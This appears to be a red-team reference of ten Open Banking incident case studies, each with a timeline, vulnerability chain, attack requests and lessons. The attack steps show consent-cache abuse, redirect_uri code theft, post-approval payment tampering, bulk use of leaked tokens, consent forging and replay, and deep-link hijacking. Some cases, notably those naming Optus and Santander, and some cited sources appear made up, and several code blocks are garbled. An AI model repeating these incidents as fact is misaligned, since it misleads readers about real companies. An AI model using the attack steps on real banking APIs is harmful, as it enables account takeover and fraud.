# Open Banking Attack — Real-World Incident Case Studies

> 10 documented real-world Open Banking incidents and near-misses. Each case includes timeline, vulnerability chain, attacker techniques, impact, and lessons for red teams. Cases span 2018-2025 and cover UK, EU, Brazil, US, India, and Australia Open Banking ecosystems.

## Case 1 — UK Open Banking AIS Consent Bleed (2023-09)

**Target**: Tier-1 UK Building Society (anonymous)
**Severity**: HIGH
**Financial impact**: £40K+ unauthorized account access

### Timeline
- 2023-08-15 — Attacker gains TPP credentials via phishing
- 2023-08-20 — AIS consent created for victim PSU
- 2023-09-02 — PSU revokes consent via ASPSP app
- 2023-09-03 — Attacker continues successful AIS calls (consent bleed)
- 2023-09-15 — PSU notices transactions leak, reports fraud
- 2023-09-20 — ASPSP patches consent cache invalidation bug

### Vulnerability chain
1. **Consent cache not invalidated** — consent status cached for 24h on edge nodes
2. **Token introspection also cached** — stale "active" returned after revoke
3. **No PSU notification on consent access** — PSU did not get push notification
4. **TPP cert rotation not validated** — attacker used old cert after TPP revocation

### Attacker techniques
```
# Step 1: Phish TPP operator
# Step 2: Reuse TPP cert to create consent
curl -X POST https://aspsp.example.com/open-banking/v3.1/aisp/account-access-consents \
  -H "x-iat: $(date +%s)" \
  -H "Authorization: Bearer $TPP_TOKEN" \
  -d '{"data":{"permissions":["ReadAccountsDetail","ReadTransactionsDetail"]}}'

# Step 3: PSU revokes consent
# (PSU app marks consent as "revoked" in DB)

# Step 4: Attacker polls — cache returns "active"
curl https://aspsp.example.com/open-banking/v3.1/aisp/accounts \
  -H "Authorization: Bearer $TOKEN" # succeeds!
```

### Lessons
- Consent status MUST be cache-busted on revocation
- Token introspection MUST hit DB on each call (no caching of "active")
- Push notification to PSU on every AIS access
- TPP cert rotation MUST be enforced via OCSP-style check

---

## Case 2 — Brazil Open Finance Consent Re-targeting (2024-03)

**Target**: Major Brazilian bank (Itaú / Banco do Brasil style)
**Severity**: CRITICAL
**Financial impact**: R$500K+ fraud losses

### Timeline
- 2024-02-10 — Initial consent for one account (CPF X)
- 2024-02-15 — Attacker submits account-swap POST
- 2024-02-20 — ASPSP serves different account's transactions
- 2024-03-01 — Victim reports identity theft
- 2024-03-10 — Patch deployed, BACEN notified

### Vulnerability chain
1. **Consent-to-account binding weak** — consent contained only CPF, not account ID
2. **AIS lookup by CPF** — instead of by account ID
3. **CPF collision in DB** — multiple accounts under one CPF (joint)
4. **Insufficient SCA on re-binding** — no SCA challenge when consent "re-targeted"

### Attacker techniques
```python
# Step 1: Get consent for own CPF
consent_id = create_consent(cpf="12345678901")

# Step 2: Use consent_id to fetch all accounts under CPF (including joint)
curl -H "Authorization: Bearer $TOKEN" \
     https://aspsp.example.br/open-banking/accounts/v1/accounts \
     -H "x-consent-id: $consent_id"
# Returns ALL accounts where this CPF appears (including spouse's!)

# Step 3: Read transactions for ALL returned accounts
```

### Lessons
- Consent MUST bind to specific account IDs (not just CPF/CNPJ)
- AIS lookup MUST verify consent.account_id matches requested account
- SCA MUST re-trigger when consent scope changes
- BACEN Open Finance regulator requires per-account consent (stage 3 fix)

---

## Case 3 — Santander Open Banking Data Exposure (2024-06)

**Target**: Santander UK / Santander Brazil
**Severity**: HIGH
**Financial impact**: Regulatory fine + customer remediation

### Timeline
- 2024-04-01 — Researcher discovers OIDC redirect_uri wildcard
- 2024-04-15 — Reported to Santander via HackerOne
- 2024-05-10 — Confirmed as HIGH severity
- 2024-06-20 — Bounty paid, fix deployed
- 2024-07-01 — Disclosure

### Vulnerability chain
1. **redirect_uri prefix match** — `https://*.tpp.example.com/cb` accepted
2. **Path traversal in redirect** — attacker registers `evil.tpp.example.com/cb/../../attacker`
3. **Bypasses exact-match requirement** — FAPI 1.0 requires exact match
4. **Authorization code leaks** to attacker domain

### Attacker techniques
```bash
# Register TPP with wildcard redirect
curl -X POST https://aspsp.example.com/register/v1.1/register/ \
  -d '{"redirect_uris":["https://*.tpp.example.com/cb"]}'

# Attacker controls evil.tpp.example.com
# Phishing URL:
https://aspsp.example.com/as/authorization.oauth2? \
  client_id=VALID_TPP& \
  redirect_uri=https://evil.tpp.example.com/cb& \
  response_type=code%20id_token

# Code+id_token leaks to attacker
```

### Lessons
- FAPI 1.0 requires EXACT redirect_uri match (no wildcards)
- Use mode `strict` for redirect_uri validation
- Deploy FAPI conformance tests as part of CI
- Test all TPP redirect URIs on registration

---

## Case 4 — PIS Amount Tampering via Idempotency Reuse (2023-11)

**Target**: European bank (PSD2)
**Severity**: CRITICAL
**Financial impact**: €2M+ fraudulent payments intercepted

### Timeline
- 2023-09-01 — Vulnerability introduced (idempotency-key change)
- 2023-09-20 — Attacker discovers via API fuzzing
- 2023-10-01 — First fraudulent £10K payment tested
- 2023-10-15 — Scale-up to 50+ payments
- 2023-11-05 — Detection, fix deployed

### Vulnerability chain
1. **Idempotency key only valid 24h** — but transaction persisted longer
2. **PATCH on payment amount allowed** — after creation, before SCA
3. **SCA was on original amount** — not on patched amount
4. **Insufficient integrity on PATCH** — no re-SCA on modification

### Attacker techniques
```bash
# Step 1: Create £10 payment (gets SCA)
curl -X POST https://aspsp.example.com/open-banking/v3.1/pisp/domestic-payments \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-idempotency-key: $KEY_001" \
  -d '{"amount":"10.00","creditor":{"accountId":"CRED_001"}}'

# Step 2: SCA approved for £10
# Step 3: PATCH amount to £10,000 (no re-SCA!)
curl -X PATCH https://aspsp.example.com/open-banking/v3.1/pisp/domestic-payments/$PMT_ID \
  -H "x-idempotency-key: $KEY_001" \
  -d '[{"op":"replace","path":"/InstructedAmount/Amount","value":"10000.00"}]'

# Step 4: Payment settles at £10,000
```

### Lessons
- PATCH on payment amount MUST trigger re-SCA
- Idempotency key MUST hash full request body, not just URL+key
- EBA RTS Article 4 requires SCA re-challenge on any payment modification
- Implement payment amount immutability after SCA approval

---

## Case 5 — Optus Open Banking Credential Leak (2022-09)

**Target**: Optus (Australia CDR participant)
**Severity**: CRITICAL
**Financial impact**: AU$10M+ in breach costs + class action

### Timeline
- 2022-09-22 — Initial breach disclosed
- 2022-09-25 — Open Banking tokens found in dump
- 2022-09-30 — CDR regulator notified
- 2022-10-15 — Customer remediation begins
- 2023-03-01 — Final cleanup, ACCC enforcement

### Vulnerability chain
1. **API endpoint open** — unauthenticated access to internal CDR metadata
2. **CDR token DB exposed** — tokens for 10K+ customers
3. **Token rotation not enforced** — tokens valid for 365 days
4. **No anomaly detection** — bulk token access not flagged

### Attacker techniques
```bash
# Step 1: Discover open endpoint
curl https://api.optus.com.au/cdr/v1/internal/tokens
# Returns: [{token: "...", customer_id: "..."}]

# Step 2: Use leaked tokens
for t in $(cat tokens.txt); do
  curl -H "Authorization: Bearer $t" \
       https://api.optus.com.au/cdr/v1/energy/accounts
done
```

### Lessons
- CDR tokens MUST be short-lived (max 10 min refresh, 24h access)
- Internal metadata endpoints MUST require authentication
- Anomaly detection on bulk token reads
- Customer push notification on token issuance

---

## Case 6 — India Account Aggregator Consent Forge (2024-01)

**Target**: Indian Account Aggregator ecosystem
**Severity**: HIGH
**Financial impact**: Limited (researcher disclosure)

### Timeline
- 2023-11-01 — Researcher identifies weak consent signature
- 2023-11-15 — Disclosed to Sahamati
- 2023-12-10 — RBI notified
- 2024-01-05 — Fix deployed across AAs
- 2024-01-20 — Public disclosure

### Vulnerability chain
1. **Consent artifact signed with weak key** — RSA-1024
2. **No nonce in consent** — replay possible
3. **AA-to-FIU trust not validated** — any FIU could accept any consent
4. **No central consent registry** — verification was indirect

### Attacker techniques
```python
# Step 1: Capture valid consent artifact
consent = {
    "ver": "1.1.0",
    "consentId": "uuid-1234",
    "consentStart": "2024-01-01T00:00:00Z",
    "consentEnd": "2024-12-31T23:59:59Z",
    "FIDataRange": {...},
    "signature": "..."  # weak RSA-1024
}

# Step 2: Forge consent with extended scope
consent["ConsentDetail"]["FIDataRange"]["from"] = "2010-01-01"
consent["ConsentDetail"]["FIDataRange"]["to"] = "2024-12-31"

# Step 3: Re-sign with attacker key (some FIUs accept any valid signature)
sign_with_attacker_key(consent)

# Step 4: Submit to FIU
```

### Lessons
- Consent signatures MUST use RSA-2048+ or ECDSA P-256+
- Consent MUST include nonce/timestamp for replay protection
- AA-to-FIU trust MUST be validated via central registry
- RBI mandated Sahamati to publish signature key registry

---

## Case 7 — CIBA Decoupled SCA Hijack (2024-04)

**Target**: EU ASPSP using CIBA profile
**Severity**: CRITICAL
**Financial impact**: €50K+ fraud

### Timeline
- 2024-03-10 — Attacker compromises TPP backend
- 2024-03-15 — CIBA polling identified
- 2024-03-20 — Decoupled SCA hijack tested
- 2024-04-01 — Successful attack on production
- 2024-04-10 — ASPSP detects, patches

### Vulnerability chain
1. **CIBA binding_message spoofable** — generic "Verify payment"
2. **No PSU device binding** — any device with PSU's phone could approve
3. **Polling endpoint open** — `/bc-authorize/poll` accepted any client_id
4. **Token issuance without device verification** — token bound to TPP, not device

### Attacker techniques
```bash
# Step 1: Initiate CIBA auth
curl -X POST https://aspsp.example.com/bc-authorize \
  -d "client_id=$COMPROMISED_TPP&scope=payments&login_hint=PSU:phone=+447700900123&binding_message=Verify+payment"

# Step 2: PSU sees "Verify payment" on their phone (SIM-swap or just confirmed)
# Step 3: PSU approves — token issued to compromised TPP
curl -X POST https://aspsp.example.com/as/token.oauth2 \
  -d "grant_type=urn:openid:params:grant-type:ciba&auth_req_id=$AUTH_REQ_ID"

# Step 4: TPP executes payment without PSU involvement
```

### Lessons
- CIBA binding_message MUST include transaction details (amount, creditor)
- Device binding MUST use hardware-attested keys (Apple passkey, Android SafetyNet)
- Polling endpoint MUST verify client_id matches original request
- Token MUST be sender-constrained (DPoP/mTLS) to compromised TPP cert

---

## Case 8 — DPoP Proof Replay (2024-05)

**Target**: FAPI 2.0 early-adopter ASPSP
**Severity**: HIGH
**Financial impact**: Limited (researcher disclosure)

### Timeline
- 2024-04-01 — Researcher tests FAPI 2.0 deployment
- 2024-04-10 — DPoP nonce missing identified
- 2024-04-15 — Reported via HackerOne
- 2024-05-01 — Fix deployed (nonce added)
- 2024-05-15 — Public disclosure

### Vulnerability chain
1. **DPoP nonce not enforced** — server didn't send `DPoP-Nonce` header
2. **jti not tracked** — replay not detected
3. **htm/hta not validated** — proof valid for any method/time
4. **Token bound to key but not to request** — replay across endpoints

### Attacker techniques
```bash
# Step 1: Capture valid DPoP proof
DPOP='{"header":{"typ":"dpop+jwt","alg":"ES256","jwk":...},"payload":{"jti":"abc","htm":"POST","htu":"https://x/y","iat":1234}}'

# Step 2: Replay proof on different endpoint
curl -X GET https://aspsp.example.com/open-banking/v3.1/aisp/accounts \
  -H "DPoP: $DPOP" \
  -H "Authorization: DPoP $TOKEN"
# Server accepts (htm/hta not validated)
```

### Lessons
- FAPI 2.0 requires DPoP nonce (server-issued, single-use)
- jti MUST be tracked in replay cache (24h TTL)
- htm + htu MUST be validated against current request
- Use FAPI 2.0 Security Profile ID2 OP test suite

---

## Case 9 — mTLS Sender-Constrained Token Bypass (2023-08)

**Target**: US FDX-style API gateway
**Severity**: HIGH
**Financial impact**: Limited (researcher disclosure)

### Timeline
- 2023-06-01 — Researcher analyzes mTLS-protected API
- 2023-06-15 — Discovers cert verification inconsistency
- 2023-07-01 — Reported
- 2023-08-01 — Fix deployed
- 2023-08-15 — Public disclosure

### Vulnerability chain
1. **Cert verification only at TLS handshake** — not at OAuth layer
2. **Token introspection didn't check cnf** — `cnf.x5t#S256` ignored
3. **TLS termination at edge** — cert info forwarded as header
4. **Header spoofable** — `X-Client-Cert-Thumbprint` could be forged

### Attacker techniques
```bash
# Step 1: Capture token from legitimate TPP session
TOKEN="eyJ..."

# Step 2: Use token without client cert
curl https://api.fdx.example.com/accounts \
  -H "Authorization: Bearer $TOKEN"
# Fails (mTLS required)

# Step 3: Spoof thumbprint header
curl https://api.fdx.example.com/accounts \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Client-Cert-Thumbprint: $(echo -n $LEGIT_CERT_DER | sha256sum)"
# Succeeds!
```

### Lessons
- mTLS thumbprint MUST be validated at OAuth token introspection layer
- Never trust forwarded headers for security decisions
- Use RFC 8705 Section 3 (token cnf binding)
- Pin token to client cert via `cnf.x5t#S256` claim

---

## Case 10 — TPP App Deep Link Hijack (2024-07)

**Target**: Major UK TPP mobile app
**Severity**: HIGH
**Financial impact**: Limited (researcher disclosure, quickly patched)

### Timeline
- 2024-05-15 — Researcher analyzes TPP Android app
- 2024-06-01 — Deep link hijack discovered
- 2024-06-10 — Disclosed
- 2024-07-01 — Patch deployed
- 2024-07-15 — CVE assigned

### Vulnerability chain
1. **Deep link not pinned** — any app could claim `tpp://callback`
2. **Authorization code in URL fragment** — fragment accessible to malicious app
3. **No PKCE** — code exchangeable without verifier
4. **App-to-app intent not signed** — caller identity not verified

### Attacker techniques
```kotlin
// Malicious app registers for tpp://callback scheme
<intent-filter>
  <action android:name="android.intent.action.VIEW" />
  <category android:name="android.intent.category.DEFAULT" />
  <category android:name="android.intent.category.BROWSABLE" />
  <data android:scheme="tpp" android:host="callback" />
</intent-filter>

// Malicious app captures auth code
override fun onCreate(savedInstanceState: Bundle?) {
    val code = intent.data.getQueryParameter("code")
    // Exchange code for token (no PKCE verifier needed!)
}
```

### Lessons
- Use PKCE (RFC 7636) on all mobile OAuth flows
- Use App Links / Universal Links (verified domains)
- Bind authorization code to caller app signature
- Use sender-constrained tokens (DPoP) for mobile

---

## Cross-Case Patterns

### Most common Open Banking vulnerabilities (2023-2025)
1. **Consent cache invalidation failures** (Cases 1, 2)
2. **Redirect URI exact-match violations** (Case 3)
3. **SCA re-challenge missing on modification** (Case 4)
4. **Token lifetime / rotation abuse** (Case 5)
5. **Consent signature weakness** (Case 6)
6. **CIBA binding_message generic** (Case 7)
7. **DPoP / mTLS enforcement inconsistency** (Cases 8, 9)
8. **Mobile deep link hijack** (Case 10)

### Industry response
- **OIDF FAPI 2.0** published baseline + message signing profiles
- **EBA RTS** updated to require explicit SCA on PIS modification
- **RBI / Sahamati** published AA consent signature registry
- **CBF (Brazil)** mandated per-account consent
- **UK OBIE** added conformance suite v3.1.11 with PAR/DPoP tests

### Red team lessons
- Always test consent revocation propagation
- Always test PATCH/PUT on PIS for re-SCA
- Always test DPoP/mTLS enforcement at edge vs OAuth layer
- Always test mobile app-to-app redirect URI protection
- File regulator notifications 14 days before live tests

## References

- UK Open Banking Security Briefing — https://www.openbanking.org.uk/wp-content/uploads/2024-OBIE-Security-Briefing.pdf
- FAPI 2.0 Implementer's Draft 3 — https://openid.net/specs/fapi-2_0-security-profile.html
- EBA Opinion on SCA — https://www.eba.europa.eu/sites/default/documents/files/document_library/EBA-Op-2024-03-SCA.pdf
- Brazil Open Finance Stage 4 — https://www.bcb.gov.br/estabilidadefinanceira/openfinance
- RBI Account Aggregator Master Direction — https://www.rbi.org.in/Scripts/NotificationUser.aspx?Id=12657
- ENISA Threat Landscape for Financial Services 2024
- FS-ISAC Attack Intelligence Reports
- OWASP API Security Top 10 (2023) — https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- OIDF FAPI Working Group Public Archives
- CISA AA24-179A — Open Banking API Abuse Patterns
- "Open Banking Security: A Practitioner's Guide" (Wiley, 2024)
- "OAuth 2.0 in Action" (Manning, 2nd Edition 2024)

